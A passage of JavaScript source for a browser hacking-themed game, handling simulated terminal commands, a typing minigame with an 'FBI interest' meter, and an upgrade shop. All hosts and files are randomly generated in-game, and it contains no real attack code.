          try { showFbiToast('-20', { duration: 1200, type: 'success' }); } catch(e){}
          renderMeters();
          appendLine('You go outside and touch grass, makes you looks normal.', 'muted');
          try { window._game.modalOpen = false; inputEl.focus(); } catch(e){}
        }
      }, 1000);
      return;
    } else if (name === 'list-owned') {
      window._game = window._game || {};
      const owned = window._game.owned || [];
      if (owned.length === 0) appendLine('No hacked machines yet.', 'muted');
      else { appendLine('Owned machines:', 'muted'); owned.forEach(l => appendLine(l)); }
      return;
    } else if (name === 'list-scan') {
      // show all previously discovered scan results so player can operate on them later
      window._game = window._game || {};
      const hist = window._game.scanHistory || [];
      if (!hist || hist.length === 0) {
        appendLine('No scan results recorded yet.', 'muted');
      } else {
        appendLine('Previously discovered scan results:', 'muted');
        hist.forEach(h => appendLine(`  ${h}`));
      }
      return;
    } else if (name === 'cat') {
        // require connection for cat (local cat removed)
        if (!connection) { appendLine('Unknown command: cat', 'muted'); appendLine("Type 'help' to see available commands.", 'muted'); return; }
        if (args.length === 0) { appendLine('Usage: cat <filename>', 'muted'); return; }
        const parts = args[0].split('/');
        // if connected, try remote files first
        if (connection) {
          const parts2 = connection.target.split('  ');
          const host = parts2[1] || parts2[0] || 'unknown';
          const files = ensureFilesMap();
          const fileObjs = files[host] || generateFilesForHost((parts2[2]||'Unknown').trim(), host);
          const found = fileObjs.find(f => f.name === args[0] || f.name.endsWith(args[0]));
          if (!found) { appendLine('File not found on remote host.', 'muted'); return; }
          appendLine(found.content);
          return;
        }
        // Not connected: try to read from downloaded files
        window._game = window._game || {};
        const dl = window._game.downloads || [];
        const local = dl.find(d => d.name === args[0] || d.name.endsWith(args[0]));
        if (!local) { appendLine('File not found in downloads.', 'muted'); return; }
        appendLine(local.content);
        return;
      const host = parts[1] || parts[0];
      const fileObjs = generateFilesForHost(cat, host);
      appendLine(`Files on ${host}:`, 'muted');
      fileObjs.forEach(f => {
        const sizeStr = typeof f.size === 'number' ? `${f.size} bytes` : '';
        appendLine(`  ${f.name}  ${sizeStr}`);
      });
      return;
    } else if (name === 'list-downloads') {
      window._game = window._game || {};
      const dl = window._game.downloads || [];
      if (dl.length === 0) {
        appendLine('No downloads recorded.', 'muted');
      } else {
        appendLine('Downloaded files:', 'muted');
        dl.forEach(d => appendLine(`  ${d.name}  from ${d.host}`));
      }
      return;
    } else if (name === 'ls') {
      // 'ls' must operate on a connected remote host and list filenames + sizes
      if (!connection) { appendLine('The specified command does not exist.', 'muted'); return; }
      try {
        const parts = (connection.target || '').split('  ');
        const cat = (parts[2] || 'Unknown').trim();
        const files = ensureFilesMap();

        // determine many possible host keys and try them (unsanitized and sanitized)
        const rawCandidates = [];
        if (parts[1]) rawCandidates.push(parts[1].trim());
        if (parts[0]) rawCandidates.push(parts[0].trim());
        if (connection.domain) rawCandidates.push(String(connection.domain).trim());
        if (connection.target) rawCandidates.push(String(connection.target).trim());
        // normalize and dedupe
        const seen = new Set();
        const candList = [];
        for (const c of rawCandidates) {
          if (!c) continue;
          const s = String(c).trim();
          if (!s) continue;
          if (!seen.has(s)) { seen.add(s); candList.push(s); }
        }
        // always include a sanitized fallback key
        const fallbackRaw = candList.length ? candList[0] : (connection.domain || connection.target || 'unknown');
        let sanitized = String(fallbackRaw).split(/[\s\/]+/)[0].replace(/[^a-zA-Z0-9._-]/g, '_');
        if (!seen.has(sanitized)) candList.push(sanitized);

        let fileObjs = null;
        let chosenHost = null;

        // Try candidates in order: exact keys, attempt generation for each, then keep the first that yields files
        for (const candidate of candList) {
          // direct lookup
          if (files[candidate] && files[candidate].length) { fileObjs = files[candidate]; chosenHost = candidate; break; }
          // try unsanitized host if candidate looks sanitized
          try {
            if (typeof generateFilesForHost === 'function') {
              const gen = generateFilesForHost(cat, candidate);
              if (gen && gen.length) {
                files[candidate] = gen;
                fileObjs = gen; chosenHost = candidate; break;
              }
            }
          } catch (e) {
            // ignore generation errors and continue
          }
        }

        // If still empty, create an on-the-fly set under the sanitized key
        if ((!fileObjs || fileObjs.length === 0)) {
          try {
            window._game = window._game || {};
            const out = [];
            const cnt = Math.min(8, Math.max(2, Math.floor(2 + Math.random() * 7)));
            for (let i = 0; i < cnt; i++) {
              const name = makeUniqueFilename(cat);
              const content = generateFileContent(name, cat);
              const size = Math.max(1, Math.min(1337, (typeof content === 'string' ? content.length : Math.floor(Math.random() * 1337))));
              out.push({ name, content, size, mtime: new Date(Date.now() - Math.floor(Math.random()*1000*60*60*24*365)).toISOString() });
            }
            files[sanitized] = out;
            fileObjs = out;
            chosenHost = sanitized;
          } catch (e) { fileObjs = []; }
        }

        if (!fileObjs || fileObjs.length === 0) {
          try {
            const keys = Object.keys(files || {});
            let picked = null;
            if (parts[1]) picked = keys.find(k => k && String(k).toLowerCase().includes(String(parts[1]).toLowerCase()));
            if (!picked && parts[0]) picked = keys.find(k => k && String(k).toLowerCase().includes(String(parts[0]).toLowerCase()));
            if (!picked && keys.length > 0) picked = keys[0];
            if (picked) { fileObjs = files[picked]; chosenHost = picked; }
          } catch(e){}
        }

        if (!fileObjs || fileObjs.length === 0) { appendLine('No files found on remote host.', 'muted'); return; }

  // debug info for mapping issues
  try { console.debug('ls: chosenHost=', chosenHost, 'files=', (fileObjs && fileObjs.length) || 0); } catch(e){}
        // header for clarity (show file count for easier debugging)
        try {
          const count = (fileObjs && fileObjs.length) ? fileObjs.length : 0;
          appendLine(`Files on ${chosenHost}: (${count} files)`, 'muted');
        } catch(e) { appendLine(`Files on ${chosenHost}:`, 'muted'); }

        // choose files to show and list them
        const want = Math.min(8, Math.max(2, Math.floor(2 + Math.random() * 7)));
        const pool = fileObjs.slice();
        for (let i = pool.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); const tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp; }
        const chosen = pool.slice(0, Math.min(want, pool.length));
        (async () => {
          try {
            for (const f of chosen) {
              await typewriterLine(`${f.name}  ${typeof f.size === 'number' ? f.size : (f.size || 0)} bytes`);
              await sleep(22);
            }
          } catch (err) {
            // If typewriter listing fails for any reason, fall back to a synchronous print
            try { console.error('ls listing error, falling back to plain print', err); } catch(e){}
            for (const f of chosen) {
              try { appendLine(`${f.name}  ${typeof f.size === 'number' ? f.size : (f.size || 0)} bytes`); } catch(e){}
            }
          }
          // Listing files with `ls` is informational only and should not
          // affect FBI interest. Leave state unchanged here.
        })();
      } catch (e) { console.error('ls error', e); appendLine('Error listing files on remote host.', 'muted'); }
      return;
    } else if (name === 'cat') {
      if (args.length === 0) {
        appendLine('Usage: cat <filename>', 'muted');
        return;
      }
      const filename = args.join(' ');
      // If connected, try to read remote host files first
      if (connection) {
        const parts = connection.target.split('  ');
        const host = parts[1] || parts[0];
        const cat = (parts[2] || 'Unknown').trim();
        const files = ensureFilesMap();
        const fileObjs = files[host] || generateFilesForHost(cat, host);
        const found = fileObjs.find(f => f.name === filename || f.name.toLowerCase() === filename.toLowerCase());
        if (!found) {
          appendLine('File not found on remote host: ' + filename, 'muted');
          return;
        }
        appendLine(`--- ${found.name} (${found.size || 0} bytes) modified: ${found.mtime || 'unknown'} ---`, 'muted');
        const lines = (found.content || '').split('\n');
        lines.forEach(l => appendLine(l));
        appendLine(`--- end of ${found.name} ---`, 'muted');
        return;
      }

      // Not connected: try to read from downloaded files
      window._game = window._game || {};
      const dl = window._game.downloads || [];
      const foundLocal = dl.find(d => d.name === filename || d.name.toLowerCase() === filename.toLowerCase());
      if (!foundLocal) { appendLine('File not found in downloads: ' + filename, 'muted'); return; }
      appendLine(`--- ${foundLocal.name} (${foundLocal.size || 0} bytes) from ${foundLocal.host} ---`, 'muted');
      const linesLocal = (foundLocal.content || '').split('\n');
      linesLocal.forEach(l => appendLine(l));
      appendLine(`--- end of ${foundLocal.name} ---`, 'muted');
      return;
    } else if (name === 'download') {
      // remote-only download command with simulated transfer
      if (!connection) { appendLine('The specified command does not exist.', 'muted'); return; }
      if (args.length === 0) { appendLine('Usage: download <filename>', 'muted'); return; }
      const filename = args.join(' ');
      const parts = connection.target.split('  ');
      const host = parts[1] || parts[0];
      const cat = (parts[2] || 'Unknown').trim();
      const files = ensureFilesMap();
      const fileObjs = files[host] || generateFilesForHost(cat, host);
      const found2 = fileObjs.find(f => f.name === filename || f.name.toLowerCase() === filename.toLowerCase());
  if (!found2) { appendLine('File not found: ' + filename, 'muted'); return; }
  // prevent downloading the same file twice
  window._game = window._game || {};
  window._game.downloads = window._game.downloads || [];
  const already = window._game.downloads.find(d => d.name === found2.name && d.host === host);
  if (already) { appendLine('File already downloaded and cannot be downloaded a second time: ' + found2.name, 'muted'); try { inputEl.focus(); } catch (e) {}; return; }

  // simulate download duration relative to file size
  // file sizes are between 1 and 1337 bytes; map linearly so:
  // 1 byte -> 1s, 1337 bytes -> 10s
  const bytesForCalc = Math.max(1, Math.min(1337, found2.size || 0));
  const minSize = 1, maxSize = 1337, minSec = 1, maxSec = 10;
  const pct = Math.min(1, Math.max(0, (bytesForCalc - minSize) / (maxSize - minSize)));
  let durationF = (minSec + pct * (maxSec - minSec));
  // apply bandwidth levels: each level reduces download time by 1 second (stacking)
  const bwLevelForCalc = (window._game && window._game.bandwidthLevel) ? window._game.bandwidthLevel : 0;
  durationF = Math.max(0.25, durationF - bwLevelForCalc);
  // round to nearest second for the simulated ticks, but keep at least 1 second unless extremely fast
  let duration = Math.max(1, Math.round(durationF));
  appendLine(`Starting download of ${found2.name} (${found2.size || 0} bytes). Estimated time: ${duration}s`, 'muted');

      // render a simple progress bar in the terminal by updating a single line
      let progress = 0;
      const totalTicks = duration;
  const progressLineIndex = (() => { appendLine(`[${' '.repeat(30)}] 0%  ${found2.name}`); return outputEl.children.length - 1; })();

      // each second, increase FBI by 1 and update progress
      let secondsElapsed = 0;
          const tick = setInterval(() => {
        secondsElapsed++;
  // downloads are riskier: generate 9x FBI interest per second (previously 3)
  if (!(window._game && window._game.modalOpen)) {
    state.fbiInterest = Math.min(100, state.fbiInterest + 9);
  try { showFbiToast('+9', { duration: 1200 }); } catch(e){}
    renderMeters();
  }
        progress = Math.min(1, secondsElapsed / totalTicks);
        const blocks = Math.floor(progress * 30);
  const bar = '[' + '#'.repeat(blocks) + ' '.repeat(30-blocks) + `] ${Math.floor(progress*100)}%  ${found2.name}`;
        // update the specific output line
        const lineEl = outputEl.children[progressLineIndex];
        if (lineEl) lineEl.textContent = bar;
        // check arrest during download
        if (state.fbiInterest >= 100) {
          clearInterval(tick);
          // non-blocking capture: show modal, apply penalty, and allow play to continue
          handleFbiCapture(`during download of ${found2.name} from ${host}`);
          appendLine(`Download interrupted: ${found2.name} (captured by FBI)`, 'muted');
          // ensure input is focused so the player can continue typing immediately
          try { inputEl.focus(); } catch (e) {}
          return;
        }
        if (secondsElapsed >= totalTicks) {
          clearInterval(tick);
          // clear active download marker
          try { if (window._game && window._game._currentDownload && window._game._currentDownload.tick === tick) delete window._game._currentDownload; } catch(e){}
          // finalize download
          // award points: if White Hat is active, downloads give no hacker score; otherwise bytes * multiplier
          const bytes = Math.max(1, Math.min(1337, found2.size || 0));
          const multForDownload = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game.lastMultiplier || 1));
          const bonus = Math.floor(bytes * multForDownload);
          state.hackerScore += bonus;
          lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
      // persist the achieved multiplier so it carries to future hacks
      try { window._game = window._game || {}; window._game.lastMultiplier = Math.max(1, hackState && hackState.multiplier ? hackState.multiplier : (window._game.lastMultiplier || 1)); } catch(e){}
          // persist download record
          window._game = window._game || {};
          // ensure lastMultiplier is preserved and never drops to 0 after download
          window._game.lastMultiplier = window._game.lastMultiplier || (hackState && hackState.multiplier) || 1;
          window._game.downloads = window._game.downloads || [];
          window._game.downloads.push({ host, name: found2.name, size: found2.size || 0, mtime: found2.mtime || new Date().toISOString(), content: found2.content });
          // show HACKER SCORE toast for the download bonus
          try { showScoreToast(`+${bonus} HACKER SCORE for downloading ${found2.name}`); } catch(e) { appendLine(`Download complete: ${found2.name} (+${bonus} pts)`, 'muted'); }
          renderMeters();
          // ensure input is focused after download finishes
          try { inputEl.focus(); } catch (e) {}
        }
      }, 1000);
      // register current download so other commands (like exit) can cancel it
      try { window._game = window._game || {}; window._game._currentDownload = { tick, progressLineIndex, name: found2.name }; } catch(e){}
      return;
    } else if (name === 'connect') {
      // gated: player must purchase unlock_connect before using connect
      const hasConnect = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_connect')) ? true : false;
      if (!hasConnect) { appendLine('Unknown command: ' + name, 'muted'); appendLine("Type 'help' to see available commands.", 'muted'); return; }
      if (args.length === 0) {
        appendLine('Usage: connect <ip|hostname>', 'muted');
        return;
      }
      window._game = window._game || {};
      const owned = window._game.owned || [];
      const target = owned.find(t => t.includes(args[0]));
      if (!target) {
        appendLine('Target not found in owned machines. Use list-owned to see hacked machines.', 'muted');
        return;
      }
  // determine host/domain for prompt — use the full hostname from the owned entry
  const parts2 = target.split('  ');
  const hostForPrompt = (parts2[1] || parts2[0]) || '';
  const domain = hostForPrompt; // use full hostname as the prompt domain
  const user = pickRandomUser();
      connection = { target, user, domain };
      appendLine('Connected to ' + target, 'muted');
  // connecting to a remote host increases FBI interest slightly
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
  renderMeters();
      // set visible prompt text
      try {
        const ps = document.querySelector('.prompt');
        if (ps) ps.textContent = `${user}@${domain}`;
      } catch(e) {}
      // show short MOTD welcoming the user to the remote host
      const parts = target.split(' ');
      const host = parts[1] || parts[0];
      appendLine(`MOTD: Welcome to ${host}`, 'muted');
      return;
    } else if (name === 'exit') {
      // If a download is active, cancel it instead of exiting a connection
      try {
        if (window._game && window._game._currentDownload) {
          const cur = window._game._currentDownload;
          try { clearInterval(cur.tick); } catch(e){}
          // update the progress line to show cancellation
          try {
            const idx = cur.progressLineIndex;
            const lineEl = outputEl.children[idx];
            if (lineEl) lineEl.textContent = `[ CANCELLED ]  ${cur.name}`;
          } catch(e){}
          delete window._game._currentDownload;
          appendLine('Download cancelled.', 'muted');
          try { inputEl.focus(); } catch(e){}
          // continue to perform normal exit behavior (disconnect / return to main terminal)
        }
      } catch(e) {}
      if (connection) {
        appendLine('Disconnected from ' + connection.target, 'muted');
        connection = null;
        try {
          const ps = document.querySelector('.prompt');
          if (ps) ps.textContent = 'guest@l33t:~$';
        } catch(e) {}
        return;
      }
    } else {
      appendLine('Unknown command: ' + name, 'muted');
      appendLine("Type 'help' to see available commands.", 'muted');
    }
    // (CLI restart command removed) UI reload is available via Play Again buttons
  }

  inputEl.addEventListener('keydown', (e) => {
    // if hack minigame active, intercept keys
    if (hackState) {
      // if a modal is open, ignore minigame input until player closes it
      if (window._game && window._game.modalOpen) {
        e.preventDefault();
        return;
      }
      e.preventDefault();
      // handle backspace
      if (e.key === 'Backspace') {
        // if current pos > 0, move back and unmark
        if (hackState.pos > 0) {
          hackState.pos--;
          const span = minigameEl.children[hackState.pos];
          span.classList.remove('good','bad');
          try { updateMinigameCursor(); } catch(e){}
        }
        return;
      }

      // ignore control keys
      if (e.key.length !== 1) return;

      const expected = hackState.command[hackState.pos];
      const ch = e.key;
      const span = minigameEl.children[hackState.pos];
      if (ch === expected) {
        span.classList.remove('bad');
        span.classList.add('good');
        hackState.pos++;
        try { updateMinigameCursor(); } catch(e){}
        // scoring: increase combo and multiplier
        hackState.combo = (hackState.combo || 0) + 1;
        // ensure multiplier starts from persisted value and increases cumulatively
        if (!hackState.multiplier) hackState.multiplier = (window._game && window._game.lastMultiplier) || 1;
        // increase multiplier by 1 for each correct char (cumulative across hacks)
        hackState.multiplier = Math.max(1, hackState.multiplier + 1);
        // award points: if White Hat is active, apply the download multiplier to minigame characters
  const mult = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game && window._game.lastMultiplier) || 1);
  const pts = 1;
      // micro-toast: small green +1 shoots out of the multiplier
  try { showMicroToast('+1', { type: 'success', duration: 1400, direction: 'right' }); } catch(e){}
      // immediately apply points to the real hacker score so the on-screen score matches state
      state.hackerScore += pts;
      lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
      hackState.currentPoints = Math.max(0, (hackState.currentPoints || 0) + pts);
        updateComboUI();
        renderMeters();
        // check complete
        if (hackState.pos >= hackState.command.length) {
          endHack(true);
        }
      } else {
      // mistake: reset combo and multiplier
      span.classList.remove('good');
      span.classList.add('bad');
      hackState.mistakes++;
    hackState.combo = 0;
    try { updateMinigameCursor(); } catch(e){}
      // immediate deflation: reduce the multiplier by half its current value once (clamped to 1)
    try {
      // cancel any existing deflate timer
      if (window._game._deflateInterval) { clearInterval(window._game._deflateInterval); window._game._deflateInterval = null; }
        const cur = Math.max(1, hackState.multiplier || (window._game && window._game.lastMultiplier) || 1);
        const decreaseAmount = Math.max(1, Math.floor(cur / 2));
        hackState.multiplier = Math.max(1, cur - decreaseAmount);
      try { window._game.lastMultiplier = Math.max(1, hackState.multiplier); } catch(e){}
        try { showMicroToast(`-${decreaseAmount}`, { type: 'danger', duration: 1400, direction: 'left' }); } catch(e){}
      renderMeters();
    } catch(e){}
    hackState.currentPoints = Math.max(0, hackState.currentPoints || 0);
      updateComboUI();
  // increase FBI meter per missed character (smaller penalty — +5 now)
  state.fbiInterest = Math.min(100, state.fbiInterest + 5);
  try { showFbiToast('+5', { duration: 1000 }); } catch(e){}
  renderMeters();
      if (state.fbiInterest >= 100) {
        handleFbiCapture('during hack minigame');
      }
      }
      return;
    }

    if (e.key === 'Enter') {
      const val = inputEl.value;
      // store in history (avoid empty and avoid consecutive duplicates)
      if (val && val.trim()) {
        if (cmdHistory.length === 0 || cmdHistory[cmdHistory.length-1] !== val) {
          cmdHistory.push(val);
        }
      }
      // reset history index to the 'new' position
      historyIndex = cmdHistory.length;

      inputEl.value = '';
      handleCommand(val);
    } else if (e.key === 'c' && e.ctrlKey) {
      inputEl.value = '';
    } else if (e.key === 'Tab') {
      // Tab completion
      e.preventDefault();
      handleTabCompletion();
    } else if (e.key === 'ArrowUp') {
      // navigate back in history
      e.preventDefault();
      if (cmdHistory.length === 0) return;
      if (historyIndex === cmdHistory.length) historyIndex = cmdHistory.length - 1;
      else historyIndex = Math.max(0, historyIndex - 1);
      inputEl.value = cmdHistory[historyIndex] || '';
      // move caret to end
      inputEl.setSelectionRange(inputEl.value.length, inputEl.value.length);
    } else if (e.key === 'ArrowDown') {
      // navigate forward in history
      e.preventDefault();
      if (cmdHistory.length === 0) return;
      if (historyIndex === -1) historyIndex = cmdHistory.length;
      historyIndex = Math.min(cmdHistory.length, historyIndex + 1);
      if (historyIndex >= cmdHistory.length) {
        inputEl.value = '';
      } else {
        inputEl.value = cmdHistory[historyIndex] || '';
      }
      inputEl.setSelectionRange(inputEl.value.length, inputEl.value.length);
    }
  });

  // commands registry for completion (connect is gated and only available after purchase)
  // 'cat' is gated: only available when connected (remote) or when purchased as an upgrade
  const COMMANDS = ['help', 'scan', 'list-scan', 'list-owned', 'exit', 'download', 'list-downloads'];
  let completionState = { lastInput: null, matches: [], index: 0 };

  // add list-downloads local command
  if (!COMMANDS.includes('list-downloads')) COMMANDS.push('list-downloads');

  // Upgrades available in the shop
  const UPGRADE_LIST = [
  { id: 'unlock_hack', name: 'Hack Tool', cost: 100, desc: 'Unlocks the hack command.' },
  { id: 'unlock_connect', name: 'Connect Tool', cost: 1000, desc: 'Unlocks the connect command.' },
  { id: 'touch_grass', name: 'Touch Grass', cost: 5000, desc: 'Unlocks the touch-grass command.' },
    { id: 'ghost', name: 'Ghost', cost: 5000, desc: 'Become a ghost. The FBI has trouble tracking you and their interest in you decreases faster.' },
    { id: 'bandwidth', name: 'Bandwidth', cost: 10000, desc: 'More internet, faster downloads.' }
  ];

  // centralized purchase application helper (used by UI)
  function applyPurchase(up) {
    window._game = window._game || {};
    window._game.purchases = window._game.purchases || [];
  // allow repeatable purchases for bandwidth and ghost; other upgrades are single-purchase
  if (up.id !== 'bandwidth' && up.id !== 'ghost' && window._game.purchases.find(p => p.id === up.id)) { appendLine('Upgrade already purchased: ' + up.name, 'muted'); return false; }
    if (state.hackerScore < up.cost) { appendLine('Not enough HACKER SCORE to purchase ' + up.name, 'muted'); return false; }
    state.hackerScore = Math.max(0, state.hackerScore - up.cost);
    window._game.purchases.push({ id: up.id, name: up.name, boughtAt: Date.now() });
    // special-case: unlock_connect requires unlock_hack dependency
    if (up.id === 'unlock_connect') {
      const hasHack = (window._game && window._game.purchases && window._game.purchases.find(p=>p.id==='unlock_hack')) ? true : false;
  if (!hasHack) { appendLine('You must purchase the Hack Tool before Connect Tool.', 'muted'); return false; }
      window._game.upgrades.unlock_connect = true;
    }
    if (up.id === 'ghost') {
      // repeatable Ghost upgrade: increases FBI decay amount by +1 per second per level
      window._game.upgrades = window._game.upgrades || {};
      window._game.ghostLevel = (window._game.ghostLevel || 0) + 1;
      // next cost doubles each purchase
      window._game.nextGhostCost = (window._game.nextGhostCost || up.cost) * 2;
    } else if (up.id === 'bandwidth') {
      // repeatable bandwidth upgrade: increment level, double price for next purchase
      window._game.upgrades = window._game.upgrades || {};
      window._game.bandwidthLevel = (window._game.bandwidthLevel || 0) + 1;
      const level = window._game.bandwidthLevel;
      // store next price so shop can display it (double each purchase)
      window._game.nextBandwidthCost = (window._game.nextBandwidthCost || up.cost) * 2;
    } else if (up.id === 'touch_grass') {
      // unlock the touch-grass command (single purchase)
      window._game.upgrades = window._game.upgrades || {};
      window._game.touchGrass = true;
    }
    appendLine(`Purchased: ${up.name} (-${up.cost} pts)`, 'muted');
  try { showToast(`-${up.cost} HACKER SCORE for ${up.name}`, { type: 'danger', duration: 5000 }); } catch(e){}
    renderMeters();
  // if this purchase unlocked a tool, hide any unlock banner
  try { if (up.id === 'unlock_hack' || up.id === 'unlock_connect') hideUnlockBanner(); } catch(e){}
    // visually mark the shop item as purchased if the shop modal is open
    try {
      const modal = document.getElementById('shop-modal');
      if (modal) {
        const item = modal.querySelector(`.shop-item[data-id="${up.id}"]`);
        if (item) {
          item.classList.add('purchased');
          const btn = item.querySelector('.shop-buy');
          if (btn) { btn.disabled = true; btn.textContent = 'Purchased'; }
        }
      }
    } catch(e){}
    // render badges immediately after a successful purchase
    try { renderUpgradeBadges(); } catch(e){}
    return true;
  }

  // render upgrade badges in the top-left HUD
  function renderUpgradeBadges() {
    try {
      const container = document.getElementById('upgrade-badges');
      if (!container) return;
      // clear
      container.innerHTML = '';
      window._game = window._game || {};
      const purchases = window._game.purchases || [];
      // Build a quick lookup of purchased counts
      const upgrades = {};
      purchases.forEach(p => { upgrades[p.id] = (upgrades[p.id] || 0) + 1; });

      // Always render all available upgrades as badges (greyed when not purchased)
      UPGRADE_LIST.forEach((u) => {
        try {
          const ownedCount = upgrades[u.id] || 0;
          const isRepeatable = (u.id === 'bandwidth' || u.id === 'ghost');
          const isOwned = isRepeatable ? (ownedCount > 0) : ((window._game && (window._game[u.id] || window._game.purchases && window._game.purchases.find(p=>p.id===u.id))) ? true : ownedCount > 0);
          // map id to a badge class
          const idToClass = {
            unlock_hack: 'hack',
            unlock_connect: 'connect',
            ghost: 'ghost',
            bandwidth: 'bandwidth',
            touch_grass: 'touchgrass'
          };
          const cls = idToClass[u.id] || 'badge';
          const b = document.createElement('div');
          // owned badges get 'owned', others are 'locked'
          b.className = 'badge ' + cls + (isOwned ? ' owned' : ' locked');
          b.setAttribute('data-id', u.id);
          b.title = u.name;
          // show full upgrade name on the badge
          b.innerHTML = `<span class="label">${u.name}</span>`;
          // if repeatable and owned, show count
          if (isRepeatable && ownedCount > 0) {
            const c = document.createElement('div'); c.className = 'count'; c.textContent = ownedCount; b.appendChild(c);
          }
          // determine affordability and toggle class
          try {
            const affordable = (typeof state.hackerScore === 'number' && state.hackerScore >= (u.cost || 0));
            if (affordable && !isOwned) b.classList.add('affordable');
            else b.classList.remove('affordable');
          } catch(e){}

          // hover tooltip: create centered tooltip and ensure it is removed when mouse leaves badge or tooltip
          b.addEventListener('mouseenter', (ev) => {
            try {
              // remove any existing tooltip first
              try { const old = document.getElementById('badge-tooltip'); if (old && old.parentNode) old.parentNode.removeChild(old); } catch(e){}
              const t = document.createElement('div'); t.className = 'badge-tooltip centered';
              t.id = 'badge-tooltip';
              // compute live cost: if repeatable, show the next dynamic cost when available
              let costForDisplay = u.cost;
              if (u.id === 'bandwidth') costForDisplay = (window._game && window._game.nextBandwidthCost) ? window._game.nextBandwidthCost : u.cost;
              if (u.id === 'ghost') costForDisplay = (window._game && window._game.nextGhostCost) ? window._game.nextGhostCost : u.cost;
              t.innerHTML = `<strong>${u.name}</strong><div style="font-size:12px;margin-top:6px">${u.desc}</div><div style="margin-top:8px;color:#bfffd6">Cost: ${costForDisplay} pts</div>`;
              document.body.appendChild(t);
              t.style.position = 'fixed';
              t.style.top = '60px';
              // allow tooltip to remove itself when the pointer leaves it
              let overTooltip = false;
              const clearTooltip = () => { try { const ex = document.getElementById('badge-tooltip'); if (ex && ex.parentNode) ex.parentNode.removeChild(ex); } catch(e){} };
              // helper to refresh tooltip cost display while visible
              const refreshTooltip = () => {
                try {
                  const ex = document.getElementById('badge-tooltip');
                  if (!ex) return;
                  let costForDisplay = u.cost;
                  if (u.id === 'bandwidth') costForDisplay = (window._game && window._game.nextBandwidthCost) ? window._game.nextBandwidthCost : u.cost;
                  if (u.id === 'ghost') costForDisplay = (window._game && window._game.nextGhostCost) ? window._game.nextGhostCost : u.cost;
                  const descEl = ex.querySelector('div');
                  const costEl = ex.querySelectorAll('div')[1];
                  if (costEl) costEl.textContent = `Cost: ${costForDisplay} pts`;
                } catch(e){}
              };
              t.addEventListener('mouseenter', () => { overTooltip = true; refreshTooltip(); });
              t.addEventListener('mouseleave', () => { overTooltip = false; clearTooltip(); });
              b.addEventListener('mouseleave', () => { setTimeout(() => { if (!overTooltip) clearTooltip(); }, 80); }, { once: true });
            } catch(e) {}
          });
          // click to purchase if not owned (or allow purchase of repeatable)
          b.addEventListener('click', () => {
            try {
              // if already owned and not repeatable, do nothing
              if (!isRepeatable && isOwned) return;
              // prepare purchase object
              let upObj = UPGRADE_LIST.find(x => x.id === u.id) || u;
              if (isRepeatable) {
                upObj = Object.assign({}, upObj);
                if (u.id === 'bandwidth') upObj.cost = (window._game && window._game.nextBandwidthCost) ? window._game.nextBandwidthCost : upObj.cost;
                if (u.id === 'ghost') upObj.cost = (window._game && window._game.nextGhostCost) ? window._game.nextGhostCost : upObj.cost;
              }
              const ok = applyPurchase(upObj);
              if (ok) {
                try { renderUpgradeBadges(); } catch(e){}
              }
            } catch(e) {}
          });
          container.appendChild(b);
        } catch(e) {}
      });
    } catch(e) { console.debug('renderUpgradeBadges err', e); }
  }

  // create the shop modal when the shop button is clicked
  function openShopModal() {
    try {
      if (document.getElementById('shop-modal')) return;
      const modal = document.createElement('div');
      modal.className = 'shop-modal';
      modal.id = 'shop-modal';
      const h = document.createElement('h3'); h.textContent = 'Upgrade Shop'; modal.appendChild(h);
      const list = document.createElement('div'); list.className = 'shop-list';
      UPGRADE_LIST.forEach((u, idx) => {
        const it = document.createElement('div'); it.className = 'shop-item';
        it.setAttribute('data-id', u.id);
        const left = document.createElement('div');
        // special handling: bandwidth and ghost should show name and the current price only (no level in shop)
        if (u.id === 'bandwidth') {
          const nextCost = (window._game && window._game.nextBandwidthCost) ? window._game.nextBandwidthCost : u.cost;
          left.innerHTML = `<div style="font-weight:700">${idx+1}. ${u.name} <span style='color:#bfffd6'>${nextCost} pts</span></div><div class='desc'>${u.desc}</div>`;
        } else if (u.id === 'ghost') {
          const nextCost = (window._game && window._game.nextGhostCost) ? window._game.nextGhostCost : u.cost;
          left.innerHTML = `<div style="font-weight:700">${idx+1}. ${u.name} <span style='color:#bfffd6'>${nextCost} pts</span></div><div class='desc'>${u.desc}</div>`;
        } else {
          left.innerHTML = `<div style="font-weight:700">${idx+1}. ${u.name} <span style='color:#bfffd6'>(${u.cost} pts)</span></div><div class='desc'>${u.desc}</div>`;
        }
        const buy = document.createElement('button'); buy.className = 'shop-buy'; buy.textContent = 'Buy';
        buy.addEventListener('click', () => {
          // for repeatable upgrades, create a dynamic purchase object with current cost
          let upObj = u;
          if (u.id === 'bandwidth' || u.id === 'ghost') {
            upObj = Object.assign({}, u);
            if (u.id === 'bandwidth') upObj.cost = (window._game && window._game.nextBandwidthCost) ? window._game.nextBandwidthCost : u.cost;
            if (u.id === 'ghost') upObj.cost = (window._game && window._game.nextGhostCost) ? window._game.nextGhostCost : u.cost;
          }
          const ok = applyPurchase(upObj);
          if (ok) {
            // for non-repeatable upgrades, visually disable buy button
            if (u.id !== 'bandwidth' && u.id !== 'ghost') { buy.disabled = true; buy.textContent = 'Purchased'; }
            // refresh the shop modal to update bandwidth level text and costs
            try {
              const modalEl = document.getElementById('shop-modal'); if (modalEl) { modalEl.parentNode.removeChild(modalEl); openShopModal(); }
              try { inputEl.focus(); } catch(e){}
            } catch(e){}
          }
        });
        // if already purchased (non-repeatable), mark as purchased immediately
        try {
          const owned = (u.id !== 'bandwidth' && u.id !== 'ghost' && window._game && window._game.purchases) ? window._game.purchases.find(p=>p.id===u.id) : null;
          if (owned) { it.classList.add('purchased'); buy.disabled = true; buy.textContent = 'Purchased'; }
        } catch(e){}
        it.appendChild(left); it.appendChild(buy);
        list.appendChild(it);
      });
      modal.appendChild(list);
      // don't create an internal close button; users should toggle the shop via the Shop button
      document.body.appendChild(modal);
      // update the shop-button to reflect open state
      try {
        const sb = document.getElementById('shop-button');
        if (sb) {
          sb.textContent = 'Close Shop';
          sb.classList.add('shop-open');
        }
      } catch (e) {}
    } catch (e) {}
  }

  // wire shop button if present
  try {
    const sb = document.getElementById('shop-button');
    if (sb) sb.addEventListener('click', () => {
      try {
